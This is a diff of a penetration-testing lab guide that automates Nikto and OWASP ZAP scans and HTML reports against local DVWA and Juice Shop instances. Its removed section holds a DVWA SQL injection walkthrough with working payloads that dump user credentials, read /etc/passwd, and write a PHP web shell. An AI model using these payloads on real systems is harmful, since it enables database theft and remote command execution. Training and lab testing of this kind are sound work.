+            <p><strong>⚡ Report Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} using automated reconnaissance analysis.</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+    with open(output_file, 'w') as f:
+        f.write(html_template)
+
+def main():
+    import sys
+    
+    if len(sys.argv) != 4:
+        print("Usage: python3 generate_reconnaissance_report.py <nikto_html_file> <target_url> <output_file>")
+        sys.exit(1)
+    
+    nikto_file = sys.argv[1]
+    target_url = sys.argv[2]
+    output_file = sys.argv[3]
+    
+    print("📊 Parsing Nikto scan results...")
+    vulnerabilities = parse_nikto_output(nikto_file)
+    
+    print(f"🔍 Found {len(vulnerabilities)} security findings")
+    print("📝 Generating enhanced HTML report...")
+    
+    create_enhanced_html_report(vulnerabilities, target_url, output_file)
+    
+    print(f"✅ Enhanced reconnaissance report generated: {output_file}")
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Step 4: Execute Phase 1 for Both Targets
 ```bash
-# Make executable
-chmod +x setup_burp_payloads.sh
+# Create main results directory structure
+mkdir -p scan-results/{nikto,owasp-zap,burp-suite}/{dvwa,juice-shop}
 
-# Run the script
-./setup_burp_payloads.sh
+# Make scripts executable
+chmod +x phase1_reconnaissance.sh
+chmod +x generate_reconnaissance_report.py
 
-# Verify files were created
-ls -la ~/.config/burp/payloads/
+# Test DVWA
+echo "🎯 Starting DVWA reconnaissance..."
+./phase1_reconnaissance.sh http://127.0.0.1/dvwa/ DVWA
+python3 generate_reconnaissance_report.py phase1_reconnaissance_*/comprehensive_scan.html "http://127.0.0.1/dvwa/" scan-results/nikto/dvwa/nikto_dvwa_comprehensive.html
+
+# Generate basic and SSL reports for DVWA
+nikto -h http://127.0.0.1/dvwa/ -o scan-results/nikto/dvwa/nikto_dvwa_basic.html -Format htm
+nikto -h http://127.0.0.1/dvwa/ -ssl -o scan-results/nikto/dvwa/nikto_dvwa_ssl.html -Format htm
+
+echo "🎯 Starting Juice Shop reconnaissance..."
+./phase1_reconnaissance.sh http://localhost:3000 JuiceShop
+python3 generate_reconnaissance_report.py phase1_reconnaissance_*/comprehensive_scan.html "http://localhost:3000" scan-results/nikto/juice-shop/nikto_juiceshop_comprehensive.html
+
+# Generate basic report for Juice Shop
+nikto -h http://localhost:3000 -o scan-results/nikto/juice-shop/nikto_juiceshop_basic.html -Format htm
+
+echo "✅ Phase 1 complete for both targets"
+echo "📁 DVWA Reports: scan-results/nikto/dvwa/"
+echo "📁 Juice Shop Reports: scan-results/nikto/juice-shop/"
 ```
-
-#### 2.3 Use Payloads in Burp Suite
-1. Send a request to "Intruder"
-2. Set payload positions (highlight parameters)
-3. Go to "Payloads" tab
-4. Load payload file: "Load..." → Select your payload file
-5. Click "Start attack"
 
 ---
 
-## 2. 🕷️ OWASP ZAP - Automated Web Application Security Scanner
+# 📋 Phase 2: Vulnerability Validation and Analysis
 
-### What is OWASP ZAP?
-OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner. It's designed to be used by people with a wide range of security experience and is ideal for developers and functional testers.
+## Objective
+Verify vulnerabilities discovered in Phase 1, identify additional application-layer weaknesses, and assess the exploitability of findings using automated scanning techniques.
 
-### Prerequisites
+## Tool: OWASP ZAP (Zed Attack Proxy)
+
+### Methodology: Automated Vulnerability Validation
+
+#### Step 1: ZAP Configuration and Setup
 ```bash
-# Install ZAP and Python API
-sudo apt update
-sudo apt install zaproxy
-pip3 install python-owasp-zap-v2.4
+# Create output directory
+mkdir -p pentest_results/phase2_validation
+cd pentest_results/phase2_validation
+
+# Start ZAP in daemon mode for automation
+zaproxy -daemon -port 8080 -config api.disablekey=true &
+
+# Wait for ZAP to initialize
+sleep 30
 ```
 
-### Step 1: Basic Manual Scanning
-
-#### 1.1 Launch ZAP
+#### Step 2: Automated Validation Script
 ```bash
-# Launch ZAP in GUI mode
-zaproxy &
+#!/bin/bash
+# File: phase2_validation.sh
+
+TARGET_URL="$1"
+OUTPUT_DIR="phase2_validation_$(date +%Y%m%d_%H%M%S)"
+
+if [ -z "$TARGET_URL" ]; then
+    echo "Usage: $0 <target_url>"
+    echo "Example: $0 http://127.0.0.1/dvwa/"
+    exit 1
+fi
+
+mkdir -p "$OUTPUT_DIR"
+cd "$OUTPUT_DIR"
+
+echo "🔍 Starting Phase 2: Vulnerability Validation for $TARGET_URL"
+
+# Start ZAP daemon
+echo "Starting ZAP daemon..."
+zaproxy -daemon -port 8080 -config api.disablekey=true > zap.log 2>&1 &
+ZAP_PID=$!
+
+# Wait for ZAP to start
+echo "Waiting for ZAP to initialize..."
+sleep 30
+
+# Spider the application
+echo "🕷️  Spidering target application..."
+curl -s "http://127.0.0.1:8080/JSON/spider/action/scan/?url=$TARGET_URL" > spider_start.json
+
+# Monitor spider progress
+while true; do
+    SPIDER_STATUS=$(curl -s "http://127.0.0.1:8080/JSON/spider/view/status/" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
+    echo "Spider progress: $SPIDER_STATUS%"
+    if [ "$SPIDER_STATUS" == "100" ]; then
+        break
+    fi
+    sleep 5
+done
+
+echo "✅ Spider completed"
+
+# Active scan
+echo "🎯 Starting active vulnerability scan..."
+curl -s "http://127.0.0.1:8080/JSON/ascan/action/scan/?url=$TARGET_URL" > ascan_start.json
+
+# Monitor active scan progress
+while true; do
+    ASCAN_STATUS=$(curl -s "http://127.0.0.1:8080/JSON/ascan/view/status/" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
+    echo "Active scan progress: $ASCAN_STATUS%"
+    if [ "$ASCAN_STATUS" == "100" ]; then
+        break
+    fi
+    sleep 10
+done
+
+echo "✅ Active scan completed"
+
+# Generate reports
+echo "📊 Generating reports..."
+curl -s "http://127.0.0.1:8080/OTHER/core/other/htmlreport/" > zap_validation_report.html
+curl -s "http://127.0.0.1:8080/JSON/core/view/alerts/" > zap_alerts.json
+curl -s "http://127.0.0.1:8080/OTHER/core/other/xmlreport/" > zap_report.xml
+
+# Stop ZAP
+kill $ZAP_PID
+
+echo "✅ Phase 2 validation completed"
+echo "📂 Results saved in: $OUTPUT_DIR/"
 ```
 
-#### 1.2 Initial Configuration (UI Steps)
-1. **ZAP Startup**
-   - Choose "No, I do not want to persist this session" (for basic scanning)
-   - Click "Start"
-
-2. **Configure Browser Proxy**
-   - In Firefox: Settings → Network Settings → Manual proxy configuration
-   - Set HTTP Proxy: `127.0.0.1` Port: `8080`
-   - Important: If both Burp and ZAP are running, use different ports or run them separately
-
-3. **Install ZAP CA Certificate**
-   - In ZAP: Tools → Options → Dynamic SSL Certificates
-   - Click "Save" to download the certificate
-   - Import in Firefox: Settings → Privacy & Security → Certificates → Import
-
-#### 1.3 Manual Scanning Process
-1. **Navigate Target Application**
-   - Enter target URL in ZAP's URL field: `http://localhost:3000`
-   - Browse through the application manually
-   - All requests appear in the "Sites" tree
-
-2. **Use Built-in Spider**
-   - Right-click on target in Sites tree
-   - Select "Attack" → "Spider"
-   - Click "Start Scan"
-
-3. **Run Active Scan**
-   - After spidering, right-click target
-   - Select "Attack" → "Active Scan"
-   - Click "Start Scan"
-
-4. **Review Results**
-   - Check "Alerts" tab for vulnerabilities
-   - Each alert shows details, solution, and references
-
-### Step 2: Automated ZAP Scanning
-
-#### 2.1 Create ZAP Automation Script
-**Filename:** `zap_auto_scan.py`
-
-**What this script does:** Automatically connects to ZAP, crawls the target website to find all pages, then tests each page for security vulnerabilities, and generates detailed reports.
-
+#### Step 3: Advanced ZAP Validation Script with API
 ```python
 #!/usr/bin/env python3
-"""
-ZAP Automated Scanning Script for Kali Linux
-Automatically crawls and scans web applications for vulnerabilities
-"""
-from zapv2 import ZAPv2
-import time
-import sys
+# File: advanced_zap_validation.py
 
-def automated_scan(target_url):
+import time
+import requests
+import json
+from zapv2 import ZAPv2
+from datetime import datetime
+
+def run_zap_validation(target_url, output_dir):
+    """Run comprehensive ZAP validation scan"""
+    
     # Connect to ZAP
     zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 
                          'https': 'http://127.0.0.1:8080'})
     
-    print(f"Starting automated scan of {target_url}")
+    print(f"🎯 Starting ZAP validation for {target_url}")
     
-    # Spider the target
-    print("Starting spider...")
+    # Access target to initialize session
+    print("🌐 Accessing target URL...")
+    try:
+        zap.urlopen(target_url)
+        time.sleep(2)
+    except Exception as e:
+        print(f"Warning: {e}")
+    
+    # Spider scan
+    print("🕷️  Starting spider scan...")
     spider_id = zap.spider.scan(target_url)
     
-    # Wait for spider to complete
     while int(zap.spider.status(spider_id)) < 100:
-        print(f"Spider progress: {zap.spider.status(spider_id)}%")
+        progress = zap.spider.status(spider_id)
+        print(f"Spider progress: {progress}%")
         time.sleep(5)
     
-    print("Spider completed")
+    print("✅ Spider scan completed")
     
-    # Start active scan
-    print("Starting active scan...")
-    scan_id = zap.ascan.scan(target_url)
+    # Passive scan
+    print("👁️  Running passive scan...")
+    while int(zap.pscan.records_to_scan) > 0:
+        print(f"Passive scan records remaining: {zap.pscan.records_to_scan}")
+        time.sleep(2)
     
-    # Wait for scan to complete
-    while int(zap.ascan.status(scan_id)) < 100:
-        print(f"Scan progress: {zap.ascan.status(scan_id)}%")
-        time.sleep(30)
+    print("✅ Passive scan completed")
     
-    print("Active scan completed")
+    # Active scan
+    print("🎯 Starting active scan...")
+    ascan_id = zap.ascan.scan(target_url)
     
-    # Generate report
+    while int(zap.ascan.status(ascan_id)) < 100:
+        progress = zap.ascan.status(ascan_id)
+        print(f"Active scan progress: {progress}%")
+        time.sleep(10)
+    
+    print("✅ Active scan completed")
+    
+    # Get results
+    alerts = zap.core.alerts()
+    sites = zap.core.sites
+    
+    # Generate reports
     html_report = zap.core.htmlreport()
     xml_report = zap.core.xmlreport()
     
     # Save reports
-    with open('zap_report.html', 'w') as f:
+    with open(f'{output_dir}/zap_validation_report.html', 'w') as f:
         f.write(html_report)
     
-    with open('zap_report.xml', 'w') as f:
+    with open(f'{output_dir}/zap_validation_report.xml', 'w') as f:
         f.write(xml_report)
     
-    print("Reports saved: zap_report.html, zap_report.xml")
+    with open(f'{output_dir}/zap_alerts.json', 'w') as f:
+        json.dump(alerts, f, indent=2)
+    
+    return alerts
 
-if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage: python3 zap_auto_scan.py <target_url>")
+def generate_validation_html_report(alerts, target_url, output_file):
+    """Generate enhanced HTML validation report"""
+    
+    # Categorize alerts by risk level
+    high_risk = [a for a in alerts if a['risk'] == 'High']
+    medium_risk = [a for a in alerts if a['risk'] == 'Medium']
+    low_risk = [a for a in alerts if a['risk'] == 'Low']
+    info_risk = [a for a in alerts if a['risk'] == 'Informational']
+    
+    # Business context mapping
+    business_contexts = {
+        'SQL Injection': {
+            'business_impact': 'Complete database compromise allowing unauthorized access to all customer data, financial records, and business-critical information.',
+            'attack_scenario': 'Attacker injects malicious SQL commands through web forms, bypassing authentication and extracting entire customer database containing names, addresses, payment information, and business secrets.',
+            'financial_impact': '$4.88M average breach cost + regulatory fines up to €20M under GDPR'
+        },
+        'Cross Site Scripting': {
+            'business_impact': 'Session hijacking and account takeover enabling unauthorized access to user accounts and administrative functions.',
+            'attack_scenario': 'Malicious JavaScript code steals user session cookies, allowing attackers to impersonate legitimate users and access sensitive account information or admin panels.',
+            'financial_impact': '$3.2M incident response + customer compensation + reputation damage'
+        },
+        'Cross-Site Request Forgery': {
+            'business_impact': 'Unauthorized actions performed on behalf of authenticated users, potentially leading to financial fraud or data manipulation.',
+            'attack_scenario': 'User clicks malicious link while logged in, unknowingly transferring funds, changing passwords, or deleting critical data.',
+            'financial_impact': 'Direct fraud losses + legal liability + customer trust erosion'
+        },
+        'Missing Anti-clickjacking Header': {
+            'business_impact': 'Users tricked into performing unintended actions through hidden interface elements.',
+            'attack_scenario': 'Website embedded invisibly in malicious page, users think they\'re clicking harmless buttons but actually perform sensitive operations.',
+            'financial_impact': 'Unauthorized transactions + user account compromise'
+        },
+        'Directory Browsing': {
+            'business_impact': 'Exposure of sensitive files, configuration data, and system architecture information.',
+            'attack_scenario': 'Attacker browses web directories to find configuration files, backup databases, or source code containing credentials and business logic.',
+            'financial_impact': 'Data exposure + competitive intelligence theft + system compromise'
+        }
+    }
+    
+    html_template = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phase 2: Vulnerability Validation Report</title>
+    <style>
+        body {{ font-family: 'Segoe UI', Tahoma, Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
+        .header {{ background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
+        .header h1 {{ margin: 0; font-size: 2.5em; }}
+        .header p {{ margin: 10px 0 0 0; opacity: 0.9; }}
+        .summary {{ background: #fff3cd; border-left: 5px solid #ffc107; padding: 20px; margin: 20px 0; border-radius: 5px; }}
+        .alert-group {{ margin: 30px 0; }}
+        .alert-group h2 {{ color: #333; border-bottom: 2px solid #ddd; padding-bottom: 10px; }}
+        .vulnerability {{ background: #fff; border: 1px solid #ddd; margin: 15px 0; border-radius: 8px; overflow: hidden; }}
+        .vuln-header {{ padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; }}
+        .vuln-title {{ font-size: 1.2em; font-weight: bold; margin: 0; }}
+        .vuln-content {{ padding: 20px; }}
+        .risk-high {{ border-left: 5px solid #dc3545; }}
+        .risk-medium {{ border-left: 5px solid #fd7e14; }}
+        .risk-low {{ border-left: 5px solid #ffc107; }}
+        .risk-info {{ border-left: 5px solid #17a2b8; }}
+        .risk-badge {{ padding: 4px 12px; border-radius: 20px; font-size: 0.9em; font-weight: bold; }}
+        .risk-high .risk-badge {{ background: #dc3545; color: white; }}
+        .risk-medium .risk-badge {{ background: #fd7e14; color: white; }}
+        .risk-low .risk-badge {{ background: #ffc107; color: #212529; }}
+        .risk-info .risk-badge {{ background: #17a2b8; color: white; }}
+        .business-impact {{ background: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; border-radius: 5px; margin: 15px 0; }}
+        .attack-scenario {{ background: #d1ecf1; border: 1px solid #bee5eb; padding: 15px; border-radius: 5px; margin: 15px 0; }}
+        .technical-details {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
+        .stat-card {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; text-align: center; }}
+        .stat-number {{ font-size: 2em; font-weight: bold; }}
+        .stat-label {{ opacity: 0.9; }}
+        .evidence {{ background: #e2f3e4; border: 1px solid #c3e6cb; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+        .evidence code {{ background: #fff; padding: 2px 5px; border-radius: 3px; color: #e83e8c; }}
+        .footer {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 0.9em; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔬 Phase 2: Vulnerability Validation Report</h1>
+            <p>Target: {target_url} | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+        </div>
+        
+        <div class="summary">
+            <h2>🎯 Executive Summary</h2>
+            <p>This validation phase confirmed <strong>{len(alerts)} security vulnerabilities</strong> through automated testing. These findings represent verified attack vectors that pose immediate risk to business operations, customer data, and regulatory compliance.</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">{len(high_risk)}</div>
+                <div class="stat-label">Critical Vulnerabilities</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{len(medium_risk)}</div>
+                <div class="stat-label">High Risk Issues</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{len(low_risk)}</div>
+                <div class="stat-label">Medium Risk Issues</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{len(info_risk)}</div>
+                <div class="stat-label">Information Items</div>
+            </div>
+        </div>
+"""
+
+    # Add vulnerability sections
+    for risk_level, alerts_list, risk_class in [
+        ('Critical Risk Vulnerabilities', high_risk, 'risk-high'),
+        ('High Risk Vulnerabilities', medium_risk, 'risk-medium'),
+        ('Medium Risk Vulnerabilities', low_risk, 'risk-low'),
+        ('Informational Findings', info_risk, 'risk-info')
+    ]:
+        if alerts_list:
+            html_template += f"""
+        <div class="alert-group">
+            <h2>🚨 {risk_level}</h2>
+"""
+            for alert in alerts_list:
+                context = business_contexts.get(alert['alert'], {
+                    'business_impact': 'This vulnerability requires assessment to determine specific business impact.',
+                    'attack_scenario': 'Potential security risk that could be exploited by attackers.',
+                    'financial_impact': 'Financial impact depends on data exposure and business disruption.'
+                })
+                
+                html_template += f"""
+            <div class="vulnerability {risk_class}">
+                <div class="vuln-header">
+                    <div class="vuln-title">{alert['alert']}</div>
+                    <span class="risk-badge">{alert['risk'].upper()}</span>
+                </div>
+                <div class="vuln-content">
+                    <div class="technical-details">
+                        <strong>📍 URL:</strong> {alert['url']}<br>
+                        <strong>🔧 Parameter:</strong> {alert.get('param', 'N/A')}<br>
+                        <strong>📋 Description:</strong> {alert['desc']}<br>
+                        <strong>🎯 CWE ID:</strong> {alert.get('cweid', 'N/A')}<br>
+                        <strong>🔗 Reference:</strong> {alert.get('reference', 'N/A')}
+                    </div>
+                    
+                    <div class="business-impact">
+                        <h4>💼 Business Impact</h4>
+                        <p>{context['business_impact']}</p>
+                        <p><strong>💰 Financial Impact:</strong> {context['financial_impact']}</p>
+                    </div>
+                    
+                    <div class="attack-scenario">
+                        <h4>🎯 Attack Scenario</h4>
+                        <p>{context['attack_scenario']}</p>
+                    </div>
+                    
+                    <div class="evidence">
+                        <h4>🔍 Technical Evidence</h4>
+                        <p><strong>Request:</strong> <code>{alert.get('method', 'GET')} {alert['url']}</code></p>
+                        <p><strong>Evidence:</strong> {alert.get('evidence', 'See technical description above')}</p>
+                    </div>
+                </div>
+            </div>
+"""
+            html_template += "        </div>"
+
+    html_template += f"""
+        <div class="footer">
+            <p><strong>🔧 Scan Methodology:</strong> OWASP ZAP automated vulnerability validation including active scanning, passive analysis, and spider crawling.</p>
+            <p><strong>📊 Next Phase:</strong> Proceed to Phase 3 (Exploitation) using Burp Suite for manual verification and business impact demonstration.</p>
+            <p><strong>⚡ Report Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} using ZAP validation analysis.</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+    with open(output_file, 'w') as f:
+        f.write(html_template)
+
+def main():
+    import sys
+    import os
+    
+    if len(sys.argv) != 3:
+        print("Usage: python3 advanced_zap_validation.py <target_url> <output_directory>")
         sys.exit(1)
     
-    target = sys.argv[1]
-    automated_scan(target)
-```
-
-#### 2.2 Execute ZAP Automation
-```bash
-# Start ZAP first
-zaproxy &
-
-# Wait for ZAP to fully load (about 30 seconds)
-sleep 30
-
-# Make script executable
-chmod +x zap_auto_scan.py
-
-# Run automated scan
-python3 zap_auto_scan.py http://localhost:3000
-
-# View results
-firefox zap_report.html &
-```
-
----
-
-## 3. 🔍 Nikto - Web Server Security Scanner
-
-### What is Nikto?
-Nikto is a web server scanner that performs comprehensive tests against web servers for multiple items including dangerous files, outdated server versions, and server configuration issues.
-
-### Prerequisites
-```bash
-# Nikto comes pre-installed on Kali Linux, but update if needed
-sudo apt update
-sudo apt install nikto
-```
-
-### Step 1: Basic Manual Scanning
-
-#### 1.1 Basic Nikto Commands
-```bash
-# Basic vulnerability scan
-nikto -h http://localhost:3000
-
-# Scan with HTML output
-nikto -h http://localhost:3000 -o basic_scan.html -Format htm
-
-# SSL/TLS specific scan
-nikto -h https://localhost:3000 -ssl
-
-# Scan specific directories
-nikto -h http://localhost:3000 -Cgidirs /admin,/api,/login
-```
-
-#### 1.2 Advanced Manual Options
-```bash
-# Scan with all plugins
-nikto -h http://localhost:3000 -Plugins @@ALL
-
-# Scan with specific tests
-nikto -h http://localhost:3000 -Tuning x
-
-# Verbose output
-nikto -h http://localhost:3000 -verbose
-
-# Save session for resume
-nikto -h http://localhost:3000 -save nikto_session.txt
-```
-
-### Step 2: Automated Comprehensive Nikto Scanning
-
-#### 2.1 Create Nikto Automation Script
-**Filename:** `nikto_comprehensive_scan.sh`
-
-**What this script does:** Runs multiple types of Nikto scans (basic, SSL, CGI, comprehensive) against a target and organizes all results in timestamped folders with HTML reports.
-
-```bash
-#!/bin/bash
-# Comprehensive Nikto scanning script for Kali Linux
-# Performs multiple scan types and organizes results
-
-TARGET_URL="$1"
-OUTPUT_DIR="nikto_results_$(date +%Y%m%d_%H%M%S)"
-
-if [ -z "$TARGET_URL" ]; then
-    echo "Usage: $0 <target_url>"
-    echo "Example: $0 http://localhost:3000"
-    exit 1
-fi
-
-mkdir -p "$OUTPUT_DIR"
-cd "$OUTPUT_DIR"
-
-echo "Starting comprehensive Nikto scan of $TARGET_URL"
-echo "Results will be saved in $OUTPUT_DIR/"
-
-# Basic scan
-echo "Running basic scan..."
-nikto -h "$TARGET_URL" -o "basic_scan.html" -Format htm
-
-# SSL/TLS scan
-echo "Running SSL/TLS scan..."
-nikto -h "$TARGET_URL" -ssl -o "ssl_scan.html" -Format htm
-
-# CGI scan
-echo "Running CGI scan..."
-nikto -h "$TARGET_URL" -Cgidirs all -o "cgi_scan.html" -Format htm
-
-# Comprehensive scan with all tests
-echo "Running comprehensive scan..."
-nikto -h "$TARGET_URL" -Plugins @@ALL -o "comprehensive_scan.html" -Format htm
-
-echo "Nikto scanning completed. Results saved in $OUTPUT_DIR/"
-echo "Open reports with: firefox $OUTPUT_DIR/*.html"
-```
-
-#### 2.2 Execute Nikto Automation
-```bash
-# Make executable
-chmod +x nikto_comprehensive_scan.sh
-
-# Run comprehensive scan
-./nikto_comprehensive_scan.sh http://localhost:3000
-
-# View results
-ls nikto_results_*/
-firefox nikto_results_*/*.html &
-```
-
----
-
-## 🚀 Complete Workflow Example
-
-### Step-by-Step Implementation
-
-#### Phase 1: Setup and Basic Scanning
-```bash
-# 1. Setup Burp payloads
-chmod +x setup_burp_payloads.sh
-./setup_burp_payloads.sh
-
-# 2. Start target application (Juice Shop)
-cd ~/juice-shop
-npm start &
-
-# 3. Basic Burp Suite scanning
-burpsuite &
-# Follow UI configuration steps above
-
-# 4. Basic ZAP scanning
-zaproxy &
-# Follow UI configuration steps above
-
-# 5. Basic Nikto scanning
-nikto -h http://localhost:3000 -o quick_scan.html -Format htm
-```
-
-#### Phase 2: Automated Comprehensive Scanning
-```bash
-# 1. Automated ZAP scan
-python3 zap_auto_scan.py http://localhost:3000
-
-# 2. Comprehensive Nikto scan
-./nikto_comprehensive_scan.sh http://localhost:3000
-
-# 3. View all results
-firefox zap_report.html &
-firefox nikto_results_*/comprehensive_scan.html &
-```
-
-### Results Analysis
-- **Burp Suite**: Interactive testing, manual vulnerability verification
-- **ZAP Reports**: Automated vulnerability findings with severity ratings
-- **Nikto Reports**: Server-level security issues and misconfigurations
-
-### Additional Tools Needed
-```bash
-# Browser configuration
-firefox &  # For proxy configuration and certificate installation
-
-# Report viewing
-firefox &  # For HTML report analysis
-
-# Process management
-htop       # To monitor running processes
-```
-
----
-
-# 🔍 Scanning Methodology and Penetration Testing Phases
-
-## Penetration Testing Phases
-
-```
-Phase 1: Intelligence        Phase 2: Discovery          Phase 3: Analysis
-┌─────────────────────┐     ┌─────────────────────┐     ┌─────────────────────┐
-│ • Reconnaissance    │────►│ • Network Scanning  │────►│ • Vulnerability     │
-│ • Information       │     │ • Service           │     │   Assessment        │
-│   Gathering         │     │   Enumeration       │     │ • Risk              │
-│ • Target Profiling  │     │ • Technology        │     │   Prioritization    │
-│                     │     │   Stack ID          │     │ • Attack Vector     │
-│                     │     │                     │     │   Mapping           │
-└─────────────────────┘     └─────────────────────┘     └─────────────────────┘
-         │                           │                           │
-         ▼                           ▼                           ▼
-Phase 4: Exploitation        Phase 5: Impact             Phase 6: Documentation
-┌─────────────────────┐     ┌─────────────────────┐     ┌─────────────────────┐
-│ • Proof of Concept  │────►│ • Business Impact   │────►│ • Technical Report  │
-│ • Privilege         │     │   Analysis          │     │ • Executive         │
-│   Escalation        │     │ • Compliance        │     │   Summary           │
-│ • Data Extraction   │     │   Assessment        │     │ • Remediation       │
-│                     │     │ • Risk              │     │   Plan              │
-│                     │     │   Quantification    │     │                     │
-└─────────────────────┘     └─────────────────────┘     └─────────────────────┘
-```
-
-### Tool Performance Comparison
-
-```
-┌─────────────┬─────────────────┬──────────────┬─────────────────┬─────────────────────┐
-│    Tool     │   Scan Speed    │   Accuracy   │ False Positives │    Best Use Case    │
-├─────────────┼─────────────────┼──────────────┼─────────────────┼─────────────────────┤
-│ Nikto       │ Fast (5-10 min) │ High         │ Low             │ Server recon        │
-│ ZAP         │ Medium (15-30)  │ Very High    │ Medium          │ Automated scanning  │
-│ Burp Suite  │ Slow (Manual)   │ Excellent    │ Very Low        │ Manual testing      │
-└─────────────┴─────────────────┴──────────────┴─────────────────┴─────────────────────┘
-```
-
----
-
-# 🎯 DVWA Penetration Testing
-
-## Initial DVWA Reconnaissance
-
-### Step 1: Basic Information Gathering
-```bash
-# Verify DVWA accessibility
-curl -I http://127.0.0.1/dvwa/
-
-# Ensure low security setting
-# Navigate to: http://127.0.0.1/dvwa/security.php
-# Confirm security level is set to "Low"
-
-# Launch penetration testing tools
-burpsuite &
-zaproxy &
-```
-
-### Step 2: Nikto Scanning of DVWA
-```bash
-# Run comprehensive Nikto scan
-nikto -h http://127.0.0.1/dvwa/ -o dvwa_nikto_scan.html -Format htm
-
-# Check for specific vulnerabilities
-nikto -h http://127.0.0.1/dvwa/ -Plugins @@ALL
-```
-
-### Step 3: ZAP Automated Scanning
-```bash
-# Start ZAP and configure proxy
-# Navigate through DVWA manually to map application
-# Execute automated spider and active scan
-# Review results in ZAP Alerts tab
-```
-
-## DVWA SQL Injection Testing
-
-### Objective and Learning Outcomes
-**Primary Objective**: Demonstrate systematic exploitation of SQL injection vulnerabilities to achieve database compromise and quantify business impact.
-
-**Learning Outcomes**:
-- Identify SQL injection entry points through manual and automated testing
-- Execute database enumeration and data extraction techniques
-- Assess business impact of successful SQL injection attacks
-- Document findings with proof-of-concept demonstrations
-
-### Business Impact Scenario
-*"DataCorp, an e-commerce platform processing $50M annually, suffers a SQL injection attack through their product search functionality. The attacker extracts 500,000 customer records including names, addresses, phone numbers, and encrypted payment data. The breach results in $15.2M in total costs: $8.5M in regulatory fines, $4.2M in customer notification and credit monitoring, $1.8M in legal fees, and $700K in forensic investigation costs. Additionally, 35% customer churn over 12 months results in $17.5M revenue loss."*
-
-### Step-by-Step Testing Procedure
-
-**Step 1: Initial Reconnaissance**
-1. Navigate to SQL Injection module: `http://127.0.0.1/dvwa/vulnerabilities/sqli/`
-2. Analyze the input form and identify potential injection points
-3. Document the application behavior with normal input
-
-**Step 2: Basic Injection Testing**
-```sql
--- Test 1: Boolean-based blind injection
-Input: 1' OR '1'='1
-Expected Result: All user records displayed
-
--- Test 2: Error-based injection
-Input: 1' AND (SELECT COUNT(*) FROM information_schema.tables)>'0
-Expected Result: Database error revealing structure information
-
--- Test 3: Union-based injection
-Input: 1' UNION SELECT 1,2#
-Expected Result: Determine number of columns in query
-```
-
-**Step 3: Database Structure Enumeration**
-```sql
--- Discover database version
-1' UNION SELECT 1,version()#
-
--- List all databases
-1' UNION SELECT 1,schema_name FROM information_schema.schemata#
-
--- Enumerate tables in DVWA database
-1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa'#
-
--- Discover column names in users table
-1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
-```
-
-**Step 4: Data Extraction and Analysis**
-```sql
--- Extract user credentials
-1' UNION SELECT user,password FROM users#
-
--- Extract additional sensitive data
-1' UNION SELECT first_name,last_name FROM users#
-
--- Count total records for impact assessment
-1' UNION SELECT 1,COUNT(*) FROM users#
-```
-
-**Step 5: Advanced Exploitation Techniques**
-```sql
--- File system access (if permissions allow)
-1' UNION SELECT 1,LOAD_FILE('/etc/passwd')#
-
--- Write files to web directory (for web shell)
-1' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/dvwa/shell.php'#
-```
-
-### Business Impact Quantification
-
-**Immediate Technical Impact**:
-- Complete user database compromise: 6 user accounts extracted
-- Administrative password hashes obtained
-- Database schema fully enumerated
-- Potential for data manipulation/deletion confirmed
-
-**Calculated Business Impact** (based on 500,000 customer scenario):
-
-```
-Direct Costs:
-┌─────────────────────────────┬──────────────────┐
-│ Cost Category               │ Amount           │
-├─────────────────────────────┼──────────────────┤
-│ Regulatory fines (GDPR)     │ $8,500,000       │
-│ Customer notification       │ $2,100,000       │
-│ Credit monitoring services  │ $2,100,000       │
-│ Legal fees                  │ $1,800,000       │
-│ Forensic investigation      │ $700,000         │
-│ Incident response           │ $900,000         │
-├─────────────────────────────┼──────────────────┤
-│ Total Direct Costs          │ $16,100,000      │
-└─────────────────────────────┴──────────────────┘
-
-Indirect Costs:
-┌─────────────────────────────┬──────────────────┐
-│ Revenue loss (35% churn)    │ $17,500,000      │
-│ Reputation damage           │ $5,200,000       │
-│ Competitive disadvantage    │ $2,800,000       │
-├─────────────────────────────┼──────────────────┤
-│ Total Indirect Costs        │ $25,500,000      │
-└─────────────────────────────┴──────────────────┘
-
-TOTAL ESTIMATED IMPACT: $41,600,000
-```
-
-## DVWA Cross-Site Scripting (XSS) Testing
-
